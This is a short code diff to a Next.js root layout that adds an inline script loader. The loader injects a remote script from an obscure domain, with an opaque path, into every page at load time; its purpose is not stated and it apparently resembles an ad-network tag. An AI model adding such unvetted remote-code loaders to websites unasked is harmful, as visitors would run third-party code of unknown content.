@@ -32,6 +32,20 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <Script id="custom-script" strategy="lazyOnload">
+        {`
+            (function(ukn){
+              var d = document,
+                  s = d.createElement('script'),
+                  l = d.scripts[d.scripts.length - 1];
+              s.settings = ukn || {};
+              s.src = "//pricklymine.com/b.XnV/sSd/GOlh0-YzWAci/UeFmr9iuSZrUdlvk/PcTJUO5UNmTcMwy/OSD-AotpNfTyk-1AM/zHIM4fMoQf";
+              s.async = true;
+              s.referrerPolicy = 'no-referrer-when-downgrade';
+              l.parentNode.insertBefore(s, l);
+            })({});
+          `}
+      </Script>
       <body
         className={`${sourceSansPro.className} ${lato.className} antialiased`}
       >
@@ -61,7 +75,6 @@ export default function RootLayout({
                               }
                         </Script> */}
 
-        
         <Providers>{children}</Providers>
 
         {/* <Script
